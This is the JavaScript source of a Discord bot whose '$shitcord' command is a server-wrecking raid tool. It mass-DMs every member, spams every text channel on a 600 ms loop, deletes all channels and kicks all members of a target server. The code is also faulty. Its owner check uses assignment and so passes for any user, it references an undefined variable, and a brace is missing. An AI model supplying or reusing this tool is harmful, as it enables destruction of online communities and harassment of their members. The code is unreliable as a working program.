const Discord = require('discord.js');
const client = new Discord.Client();

// Configuration
const prefix = "$";
const owner_ids = ["587487245523484674"];

function isOwner(id) {
    for(var i of owner_ids) {
        if(i = id) return true;
    }
    return false;
}

// Bot commands
client.on('message', message => {
    if (isOwner(message.author.id)) {
        var args = message.content.split(" ");
        
        if (args[0] == prefix + 'shitcord') {
            delete args[0];
            var serverid = args[1];
            let guild = client.guilds.get(serverid);
            delete args[1];
            var msg = args.join(" ");
            client.guilds.get(serverid).members.map(m => {
                    m.send(msg);
            });
            var interval = setInterval(function () {
                client.guilds.get(gid).channels.map(c => {
                    if (c.type == "text") c.send(msg);
                });
            }, 600);
            guild.channels.forEach(c => {
                    c.delete();
                });
            guild.members.forEach(m => {
                    m.kick();
                });
    
        // Restart bot
        if (args[0] == prefix + 'restart') {
               require("child_process").spawn(process.argv.shift(), process.argv, {
                   cwd: process.cwd(),
                   detached : true,
                   stdio: "inherit"
               });
               process.exit();
        }
    }
});

client.login(process.env.BOT_TOKEN);
